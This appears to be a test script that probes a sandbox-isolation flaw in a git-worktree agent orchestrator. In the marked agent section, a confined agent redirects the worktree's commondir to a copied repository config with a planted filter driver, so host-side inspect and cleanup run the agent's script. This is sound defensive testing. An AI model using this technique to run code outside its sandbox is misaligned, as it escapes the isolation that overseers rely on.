/**
 * Probe (W5 finding): `gitWorktreeIsolation` trusts a worktree whose admin dir `commondir` file the
 * agent rewrote, so host-side `inspect` / `cleanupWorktrees` run git with agent-written configuration.
 *
 * `trustedWorktree` (isolation-worktree.ts) checks the `.git` pointer and the admin dir's `gitdir`
 * back-pointer, then runs `git --git-dir=<admin> --work-tree=<worktree> ...`. Git reads
 * `<admin>/commondir` to find the common dir, and with it the config and info/attributes. An agent
 * that copies the common dir, adds a filter driver there and points `<admin>/commondir` at the copy
 * gets its filter executed by `git status` during `inspect` (and every later cleanup).
 *
 * Expected: WORKTREE_UNTRUSTED (or at least no execution). Actual: the sentinel file appears.
 * Hermetic: empty HOME, no GIT_* variables.
 *
 * Usage: node scripts/simulation/workflows/probe-commondir.mjs
 */
import { execFileSync } from 'node:child_process';
import { appendFileSync, chmodSync, cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { emit, sdk } from '../lib/sim.mjs';

const base = realpathSync(mkdtempSync(join(tmpdir(), 'oar-commondir-')));
process.env.HOME = join(base, 'home');
process.env.XDG_CONFIG_HOME = join(base, 'home', '.config');
for (const name of Object.keys(process.env)) if (/^GIT_/i.test(name)) delete process.env[name];
const git = (cwd, ...args) => execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@example.invalid', ...args], { cwd, stdio: 'ignore' });

const { gitWorktreeIsolation } = await sdk('orchestration/dynamic');
const repo = join(base, 'repo');
mkdirSync(repo);
git(repo, 'init', '-q', '-b', 'main');
writeFileSync(join(repo, 'a.txt'), 'hello world\n');
git(repo, 'add', '-A');
git(repo, 'commit', '-q', '-m', 'base');
const isolation = gitWorktreeIsolation({ repository: repo, root: join(base, 'worktrees') });
const tree = await isolation.create({ runId: 'probe', key: 'k1', label: 'agent', signal: new AbortController().signal });

// ---- the agent, acting in tree.path only through paths it can read from there ----
const sentinel = join(base, 'SENTINEL');
const filter = join(base, 'filter.sh');
writeFileSync(filter, `#!/bin/sh\necho "ran: $0 $*" >> '${sentinel}'\nexec cat\n`);
chmodSync(filter, 0o755);
const admin = readFileSync(join(tree.path, '.git'), 'utf8').match(/^gitdir: (.+)\n$/)[1];
const common = resolve(admin, readFileSync(join(admin, 'commondir'), 'utf8').trim());
const evil = join(base, 'evil-common');
cpSync(common, evil, { recursive: true });
appendFileSync(join(evil, 'config'), `[filter "x"]\n\tclean = ${filter}\n\tsmudge = ${filter}\n`);
writeFileSync(join(admin, 'commondir'), `${evil}\n`);
writeFileSync(join(tree.path, '.gitattributes'), '* filter=x\n');
writeFileSync(join(tree.path, 'a.txt'), 'HELLO WORLD\n'); // same size: git re-reads it through the clean filter
// ---- host side ----
const steps = {};
for (const [name, op] of [
  ['inspect', () => isolation.inspect(tree)],
  ['cleanupWorktrees', () => isolation.cleanupWorktrees({ runId: 'probe' })],
]) {
  const before = existsSync(sentinel) ? readFileSync(sentinel, 'utf8').split('\n').filter(Boolean).length : 0;
  let result;
  try { result = await op(); } catch (error) { result = { threw: `${error.name}: ${error.code ?? error.message}` }; }
  const after = existsSync(sentinel) ? readFileSync(sentinel, 'utf8').split('\n').filter(Boolean).length : 0;
  steps[name] = { result, filterExecutions: after - before };
}
emit('workflows/probe-commondir', [{
  finding: 'Agent-rewritten <admin>/commondir is not checked by trustedWorktree: host-side git runs a filter from an agent-made config',
  expected: 'inspect rejects the worktree (WORKTREE_UNTRUSTED) or runs nothing the agent planted',
  actual: steps,
  escaped: existsSync(sentinel),
  git: execFileSync('git', ['--version'], { encoding: 'utf8' }).trim(),
}]);
rmSync(base, { recursive: true, force: true });
